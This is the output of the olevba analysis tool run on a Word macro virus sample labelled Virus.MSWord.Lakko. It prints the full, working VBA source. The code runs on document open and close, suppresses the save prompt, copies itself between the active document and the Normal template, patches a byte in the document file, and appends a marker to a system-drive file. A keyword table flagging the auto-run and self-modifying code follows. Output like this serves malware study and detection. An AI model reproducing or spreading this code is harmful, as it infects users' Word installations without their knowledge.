olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lakko
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lakko - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'**************************
Private Sub Document_Close()
On Error Resume Next
Call KOLLA
If Month(Date) Mod 3 = 0 Then
Open "C:\Windows.sys" For Append As #7
Print #7, Date & "  " & Time & " --- ***"
Close #7
End If
End Sub
Private Sub KOLLA()
On Error Resume Next
Application.ScreenUpdating = False
Application.Options.SaveNormalPrompt = False
x$ = "C:\__.__"
MacroContainer.VBProject.vbcomponents.Item("ThisDocument").Export x$
Open x$ For Input As #1
keimeno = Input(LOF(1), 1)
Close #1
kk& = InStr(1, keimeno, "'**************************")
keimeno = Right$(keimeno, Len(keimeno) - kk& + 1)
      If MacroContainer.Name = NormalTemplate.Name Then 'run from normal
If ActiveDocument.VBProject.vbcomponents.Item("ThisDocument").CodeModule.CountOfLines > 0 Then
ActiveDocument.VBProject.vbcomponents.Item("ThisDocument").CodeModule.DeleteLines 1, ActiveDocument.VBProject.vbcomponents.Item("ThisDocument").CodeModule.CountOfLines
End If
ActiveDocument.VBProject.vbcomponents.Item("ThisDocument").CodeModule.AddFromString (keimeno)
       Else     'running from activedocument
If NormalTemplate.VBProject.vbcomponents.Item("ThisDocument").CodeModule.CountOfLines > 0 Then
NormalTemplate.VBProject.vbcomponents.Item("ThisDocument").CodeModule.DeleteLines 1, NormalTemplate.VBProject.vbcomponents.Item("ThisDocument").CodeModule.CountOfLines
End If
NormalTemplate.VBProject.vbcomponents.Item("ThisDocument").CodeModule.AddFromString (keimeno)
NormalTemplate.Save
       End If
'====================
Dim PRos As Byte
PRos = 1
fff = FreeFile
If Dir(ActiveDocument.FullName, 6) <> "" Then
Open ActiveDocument.FullName For Binary As #fff
Put #fff, 862, PRos
Close #fff
ActiveDocument.Save
End If
Kill x$
Application.ScreenUpdating = True
End Sub
Private Sub Document_Open()
Call KOLLA
End Sub









































































































































































































































































































































































































































































































































































































































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

